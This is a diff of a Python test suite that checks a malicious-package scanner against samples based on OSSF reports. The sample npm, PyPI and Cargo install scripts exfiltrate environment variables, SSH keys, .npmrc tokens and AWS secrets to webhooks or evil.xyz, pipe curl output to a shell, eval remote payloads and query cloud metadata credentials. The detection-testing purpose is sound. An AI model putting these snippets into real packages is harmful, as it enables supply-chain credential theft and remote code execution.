@@ -44,9 +44,29 @@ async def _blocked(reg, files, scripts=None, age=24, name="test-pkg"):
         p.write_bytes(content) if isinstance(content, bytes) else p.write_text(content)
         arts.append(p)
     scanner_map = {
-        "npm": [IOCScanner(), CooldownScanner(s), MetadataScanner(), StaticAnalysisScanner(s), HeuristicsScanner(), ASTScanner()],
-        "pypi": [IOCScanner(), CooldownScanner(s), MetadataScanner(), PyPIStaticAnalysisScanner(s), HeuristicsScanner(), ASTScanner()],
-        "cargo": [IOCScanner(), CooldownScanner(s), MetadataScanner(), CargoStaticAnalysisScanner(s), HeuristicsScanner()],
+        "npm": [
+            IOCScanner(),
+            CooldownScanner(s),
+            MetadataScanner(),
+            StaticAnalysisScanner(s),
+            HeuristicsScanner(),
+            ASTScanner(),
+        ],
+        "pypi": [
+            IOCScanner(),
+            CooldownScanner(s),
+            MetadataScanner(),
+            PyPIStaticAnalysisScanner(s),
+            HeuristicsScanner(),
+            ASTScanner(),
+        ],
+        "cargo": [
+            IOCScanner(),
+            CooldownScanner(s),
+            MetadataScanner(),
+            CargoStaticAnalysisScanner(s),
+            HeuristicsScanner(),
+        ],
     }
     pkg = PackageInfo(
         name=name,
@@ -70,7 +90,9 @@ async def test_ossf_npm_01_env_exfil_discord():
     """OSSF: npm env exfil via Discord webhook (MAL-2024-1xxx pattern)."""
     assert await _blocked(
         "npm",
-        {"index.js": "const d=JSON.stringify(process.env);fetch('https://discord.com/api/webhooks/1234/TOKEN',{method:'POST',body:d});"},
+        {
+            "index.js": "const d=JSON.stringify(process.env);fetch('https://discord.com/api/webhooks/1234/TOKEN',{method:'POST',body:d});"
+        },
         {"postinstall": "node index.js"},
     )
 
@@ -88,7 +110,9 @@ async def test_ossf_npm_03_ssh_key_theft():
     """OSSF: SSH key reading + exfiltration."""
     assert await _blocked(
         "npm",
-        {"s.js": "const fs=require('fs'),os=require('os');const k=fs.readFileSync(os.homedir()+'/.ssh/id_rsa','utf8');fetch('https://evil.xyz/?k='+encodeURIComponent(k));"},
+        {
+            "s.js": "const fs=require('fs'),os=require('os');const k=fs.readFileSync(os.homedir()+'/.ssh/id_rsa','utf8');fetch('https://evil.xyz/?k='+encodeURIComponent(k));"
+        },
         {"postinstall": "node s.js"},
     )
 
@@ -97,7 +121,9 @@ async def test_ossf_npm_04_npm_token_theft():
     """OSSF: .npmrc token theft (common in npm supply chain attacks)."""
     assert await _blocked(
         "npm",
-        {"s.js": "const fs=require('fs'),os=require('os');const rc=fs.readFileSync(os.homedir()+'/.npmrc','utf8');require('https').get('https://evil.xyz/?t='+encodeURIComponent(rc));"},
+        {
+            "s.js": "const fs=require('fs'),os=require('os');const rc=fs.readFileSync(os.homedir()+'/.npmrc','utf8');require('https').get('https://evil.xyz/?t='+encodeURIComponent(rc));"
+        },
         {"postinstall": "node s.js"},
     )
 
@@ -106,7 +132,9 @@ async def test_ossf_npm_05_telegram_exfil():
     """OSSF: Telegram bot exfiltration (frequent in OSSF reports)."""
     assert await _blocked(
         "npm",
-        {"s.js": "const d=JSON.stringify({env:process.env,hostname:require('os').hostname()});fetch('https://api.telegram.org/bot123:TOKEN/sendMessage?chat_id=456&text='+encodeURIComponent(d));"},
+        {
+            "s.js": "const d=JSON.stringify({env:process.env,hostname:require('os').hostname()});fetch('https://api.telegram.org/bot123:TOKEN/sendMessage?chat_id=456&text='+encodeURIComponent(d));"
+        },
         {"postinstall": "node s.js"},
     )
 
@@ -115,7 +143,9 @@ async def test_ossf_npm_06_base64_payload_fetch():
     """OSSF: base64-encoded payload URL fetched and executed."""
     assert await _blocked(
         "npm",
-        {"s.js": "const url=Buffer.from('aHR0cHM6Ly9ldmlsLnh5ei9wYXlsb2Fk','base64').toString();eval(require('child_process').execSync('curl -s '+url).toString());"},
+        {
+            "s.js": "const url=Buffer.from('aHR0cHM6Ly9ldmlsLnh5ei9wYXlsb2Fk','base64').toString();eval(require('child_process').execSync('curl -s '+url).toString());"
+        },
         {"postinstall": "node s.js"},
     )
 
@@ -124,7 +154,9 @@ async def test_ossf_npm_07_process_env_post():
     """OSSF: POST process.env to attacker server."""
     assert await _blocked(
         "npm",
-        {"s.js": "const https=require('https');const data=JSON.stringify(process.env);const req=https.request({hostname:'evil.xyz',method:'POST'},()=>{});req.end(data);"},
+        {
+            "s.js": "const https=require('https');const data=JSON.stringify(process.env);const req=https.request({hostname:'evil.xyz',method:'POST'},()=>{});req.end(data);"
+        },
         {"postinstall": "node s.js"},
     )
 
@@ -138,7 +170,9 @@ async def test_ossf_pypi_01_setup_os_system():
     """OSSF: setup.py with os.system() — most common PyPI attack vector."""
     assert await _blocked(
         "pypi",
-        {"setup.py": "import os\nos.system('pip install cryptography && python -c \"import urllib.request; urllib.request.urlopen(\\\"https://evil.xyz/steal\\\")\"')"},
+        {
+            "setup.py": 'import os\nos.system(\'pip install cryptography && python -c "import urllib.request; urllib.request.urlopen(\\"https://evil.xyz/steal\\")"\')'
+        },
     )
 
 
@@ -154,7 +188,9 @@ async def test_ossf_pypi_03_requests_exfil():
     """OSSF: requests-based credential exfiltration."""
     assert await _blocked(
         "pypi",
-        {"setup.py": "import os,urllib.request\nurllib.request.urlopen('https://evil.xyz/c?d='+os.environ.get('AWS_SECRET_ACCESS_KEY',''))"},
+        {
+            "setup.py": "import os,urllib.request\nurllib.request.urlopen('https://evil.xyz/c?d='+os.environ.get('AWS_SECRET_ACCESS_KEY',''))"
+        },
     )
 
 
@@ -170,7 +206,9 @@ async def test_ossf_pypi_05_webhook_discord():
     """OSSF: Discord webhook data exfiltration."""
     assert await _blocked(
         "pypi",
-        {"setup.py": "import os,urllib.request,json\ndata=json.dumps({'content':str(os.environ)})\nurllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/123/TOKEN',data.encode()))"},
+        {
+            "setup.py": "import os,urllib.request,json\ndata=json.dumps({'content':str(os.environ)})\nurllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/123/TOKEN',data.encode()))"
+        },
     )
 
 
@@ -178,7 +216,9 @@ async def test_ossf_pypi_06_cmdclass_override():
     """OSSF: setup.py cmdclass override for install-time execution."""
     assert await _blocked(
         "pypi",
-        {"setup.py": "from setuptools import setup\nfrom setuptools.command.install import install\nclass C(install):\n    def run(self):\n        import os;os.system('curl evil.xyz|bash')\n        install.run(self)\nsetup(cmdclass={'install':C})"},
+        {
+            "setup.py": "from setuptools import setup\nfrom setuptools.command.install import install\nclass C(install):\n    def run(self):\n        import os;os.system('curl evil.xyz|bash')\n        install.run(self)\nsetup(cmdclass={'install':C})"
+        },
     )
 
 
@@ -191,7 +231,9 @@ async def test_ossf_cargo_01_build_rs_curl():
     """OSSF: build.rs with curl execution (Rust supply chain pattern)."""
     assert await _blocked(
         "cargo",
-        {"build.rs": 'use std::process::Command;\nfn main() {\n    Command::new("sh").arg("-c").arg("curl https://evil.xyz/steal | sh").output().unwrap();\n}'},
+        {
+            "build.rs": 'use std::process::Command;\nfn main() {\n    Command::new("sh").arg("-c").arg("curl https://evil.xyz/steal | sh").output().unwrap();\n}'
+        },
     )
 
 
@@ -199,7 +241,9 @@ async def test_ossf_cargo_02_crypto_key_theft():
     """OSSF: Solana/ETH key theft (faster_log / evm-units pattern)."""
     assert await _blocked(
         "cargo",
-        {"src/lib.rs": 'use std::fs;\nuse std::env;\nfn steal() {\n    let home = env::var("HOME").unwrap();\n    let key = fs::read_to_string(format!("{}/.ssh/id_rsa", home)).unwrap();\n    reqwest::blocking::get(&format!("https://evil.xyz/?k={}", key));\n}'},
+        {
+            "src/lib.rs": 'use std::fs;\nuse std::env;\nfn steal() {\n    let home = env::var("HOME").unwrap();\n    let key = fs::read_to_string(format!("{}/.ssh/id_rsa", home)).unwrap();\n    reqwest::blocking::get(&format!("https://evil.xyz/?k={}", key));\n}'
+        },
     )
 
 
@@ -207,7 +251,9 @@ async def test_ossf_cargo_03_env_exfil():
     """OSSF: Environment variable exfiltration in build.rs."""
     assert await _blocked(
         "cargo",
-        {"build.rs": 'use std::process::Command;\nfn main() {\n    let home = std::env::var("HOME").unwrap_or_default();\n    Command::new("curl").arg(format!("https://evil.xyz/?h={}", home)).output().ok();\n}'},
+        {
+            "build.rs": 'use std::process::Command;\nfn main() {\n    let home = std::env::var("HOME").unwrap_or_default();\n    Command::new("curl").arg(format!("https://evil.xyz/?h={}", home)).output().ok();\n}'
+        },
     )
 
 
@@ -215,7 +261,9 @@ async def test_ossf_cargo_04_cloud_metadata():
     """OSSF: Cloud metadata access in Rust."""
     assert await _blocked(
         "cargo",
-        {"src/lib.rs": 'fn init() {\n    let resp = reqwest::blocking::get("http://169.254.169.254/latest/meta-data/iam/security-credentials/").unwrap();\n}'},
+        {
+            "src/lib.rs": 'fn init() {\n    let resp = reqwest::blocking::get("http://169.254.169.254/latest/meta-data/iam/security-credentials/").unwrap();\n}'
+        },
     )
 
 
@@ -223,7 +271,9 @@ async def test_ossf_cargo_05_webhook_exfil():
     """OSSF: Webhook exfiltration from build.rs."""
     assert await _blocked(
         "cargo",
-        {"build.rs": 'use std::process::Command;\nfn main() {\n    Command::new("curl").args(&["-X","POST","https://hooks.slack.com/services/T00/B00/xxx","-d","stolen data"]).output().ok();\n}'},
+        {
+            "build.rs": 'use std::process::Command;\nfn main() {\n    Command::new("curl").args(&["-X","POST","https://hooks.slack.com/services/T00/B00/xxx","-d","stolen data"]).output().ok();\n}'
+        },
     )
 
 
@@ -270,10 +320,10 @@ async def test_ossf_benchmark_summary():
             _ALL_TESTS[name] = "FAIL"
 
     rate = passed / total * 100
-    print(f"\n{'='*60}")
+    print(f"\n{'=' * 60}")
     print(f"OSSF malicious-packages benchmark: {passed}/{total} ({rate:.0f}%)")
     for name, status in _ALL_TESTS.items():
         icon = "+" if status == "PASS" else "-"
         print(f"  [{icon}] {name}")
-    print(f"{'='*60}")
+    print(f"{'=' * 60}")
     assert rate >= 90, f"OSSF detection rate {rate:.0f}% below 90% target"
